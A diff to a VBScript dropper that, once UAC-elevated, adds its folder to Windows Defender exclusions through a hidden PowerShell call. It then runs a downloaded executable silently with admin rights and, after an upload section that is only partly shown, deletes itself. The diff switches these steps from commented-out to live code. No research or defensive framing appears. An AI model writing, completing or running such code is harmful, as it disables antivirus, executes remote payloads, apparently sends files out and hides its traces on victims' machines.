@@ -40,14 +40,14 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
 '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     ' Add the folder to Windows Defender exclusions (PowerShell) - Hidden Window
-    ' strPowerShellCommand = "powershell.exe -Command ""Add-MpPreference -ExclusionPath '" & strFolderPath & "'"""
-    ' objShell.ShellExecute "powershell.exe", "-WindowStyle Hidden -Command """ & strPowerShellCommand & """", "", "runas", 0
-    ' If Err.Number <> 0 Then
-    '     'WScript.Echo "Error adding exclusion: " & Err.Description
-    '     Err.Clear
-    ' Else
-    '     'WScript.Echo "Folder successfully excluded from Windows Defender."
-    ' End If
+    strPowerShellCommand = "powershell.exe -Command ""Add-MpPreference -ExclusionPath '" & strFolderPath & "'"""
+    objShell.ShellExecute "powershell.exe", "-WindowStyle Hidden -Command """ & strPowerShellCommand & """", "", "runas", 0
+    If Err.Number <> 0 Then
+        'WScript.Echo "Error adding exclusion: " & Err.Description
+        Err.Clear
+    Else
+        'WScript.Echo "Folder successfully excluded from Windows Defender."
+    End If
 '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     ' Array of files to download (***REPLACE WITH YOUR URLS AND FILENAMES***)
     arrFiles = Array( _
@@ -91,31 +91,26 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
         End If
     Next
 '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    ' ' Set the file name to execute
-    ' strExecutableFileName = "target_script.exe" ' The name of the file to execute
+    ' Set the file name to execute
+    strExecutableFileName = "target_script.exe" ' The name of the file to execute
 
-    ' ' Loop through downloaded files and check if it's the one we need to execute
-    ' For Each arrFile In arrFiles
-    '     strLocalFile = arrFile(1)
-    '     If LCase(strLocalFile) = LCase(strExecutableFileName) Then ' Case-insensitive comparison
-    '         strLocalPath = strFolderPath & "\" & strLocalFile
+    ' Loop through downloaded files and check if it's the one we need to execute
+    For Each arrFile In arrFiles
+        strLocalFile = arrFile(1)
+        If LCase(strLocalFile) = LCase(strExecutableFileName) Then ' Case-insensitive comparison
+            strLocalPath = strFolderPath & "\" & strLocalFile
 
             ' Execute the downloaded file
-            ' objShell.ShellExecute "cmd.exe", "/C """ & strLocalPath & """ >nul 2>&1", strFolderPath, "runas", 0
-            ' If Err.Number <> 0 Then
-            '     'WScript.Echo "Error running downloaded file: " & Err.Description
-            '     Err.Clear
-            ' Else
-            '     'WScript.Echo "Downloaded file executed."
-            ' End If
-    '     End If
-    ' Next
+            objShell.ShellExecute "cmd.exe", "/C """ & strLocalPath & """ >nul 2>&1", strFolderPath, "runas", 0
+            If Err.Number <> 0 Then
+                'WScript.Echo "Error running downloaded file: " & Err.Description
+                Err.Clear
+            Else
+                'WScript.Echo "Downloaded file executed."
+            End If
+        End If
+    Next
 '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    ' Schedule the deletion of the script after a delay
-    ' strScriptPath = WScript.ScriptFullName
-    ' objShell.ShellExecute "cmd.exe", "/C del """ & strScriptPath & """", "", "", 0
-'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    'WScript.Echo "Finished."
 
     Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
     Set objWScriptShell = CreateObject("WScript.Shell")
@@ -210,5 +205,10 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
     Else
         'MsgBox "Error uploading file: " & xmlhttp.Status & " - " & xmlhttp.statusText
     End If
+'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+    ' Schedule the deletion of the script after a delay
+    strScriptPath = WScript.ScriptFullName
+    objShell.ShellExecute "cmd.exe", "/C del """ & strScriptPath & """", "", "", 0
+'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 End If
